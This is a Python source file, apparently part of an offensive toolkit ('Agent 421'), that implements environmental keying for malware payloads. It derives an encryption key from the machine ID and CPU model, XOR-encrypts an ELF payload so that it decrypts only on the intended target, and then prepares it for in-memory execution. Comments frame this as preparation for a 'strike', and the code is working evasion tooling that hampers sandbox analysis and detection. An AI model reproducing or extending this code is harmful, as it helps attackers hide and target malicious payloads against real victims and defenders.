#!/home/dan/Chimera_Project/venv/bin/python3
import os
import hashlib
import subprocess

class LogicMask:
    """
    Agent 421: Environmental Keying & Logic Masking.
    Derives decryption keys from hardware artifacts to ensure 
    the payload only executes on the intended target.
    """
    def _get_hw_fingerprint(self):
        """Actionable: Gathers hardware constants for key derivation."""
        try:
            # 1. Get Machine ID (Unique OS Identifier)
            with open("/etc/machine-id", "r") as f:
                mid = f.read().strip()
            
            # 2. Get CPU Model Name
            cpu = subprocess.check_output("grep 'model name' /proc/cpuinfo", shell=True).decode()
            
            # 3. Combine and Hash to create a 32-byte AES-ready key
            combined = f"{mid}{cpu}".encode()
            return hashlib.sha256(combined).digest()
        except Exception as e:
            # If we can't fingerprint, we use a random 'fail' key
            return os.urandom(32)

    def wrap_payload(self, raw_payload_path, output_path):
        print("--- [AGENT 421: ENVIRONMENTAL WRAPPING START] ---")
        
        key = self._get_hw_fingerprint()
        print(f"[*] Derived Environmental Key: {key.hex()[:16]}...")

        if not os.path.exists(raw_payload_path):
            return

        with open(raw_payload_path, "rb") as f:
            data = f.read()

        # Encrypt: Simple XOR for the POC, but the 'Key' is the secret.
        # In a strike, use AES-256-GCM via 'cryptography' lib.
        masked_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

        with open(output_path, "wb") as f:
            f.write(masked_data)

        print(f"[\033[92mSUCCESS\033[0m] Target-locked payload created: {output_path}")

    def execute_with_mask(self, masked_payload_path):
        """Actionable: Decrypts and runs in memory (Agent 411 style)."""
        key = self._get_hw_fingerprint()
        
        with open(masked_payload_path, "rb") as f:
            masked_data = f.read()
        
        # Attempt decryption
        original_data = bytes([masked_data[i] ^ key[i % len(key)] for i in range(len(masked_data))])
        
        # Check if successful (Looking for ELF header \x7fELF)
        if original_data.startswith(b"\x7fELF"):
            print("[\033[92mUNLOCK\033[0m] Environment Match. Executing payload...")
            # Here we would call Agent 411's memfd_create logic
            return True
        else:
            print("[\033[91mFAIL\033[0m] Environment Mismatch. Payload remains masked.")
            return False

if __name__ == "__main__":
    # Test: Lock 'ls' to this specific machine
    lm = LogicMask()
    lm.wrap_payload("/bin/ls", "/tmp/locked_agent")
    lm.execute_with_mask("/tmp/locked_agent")
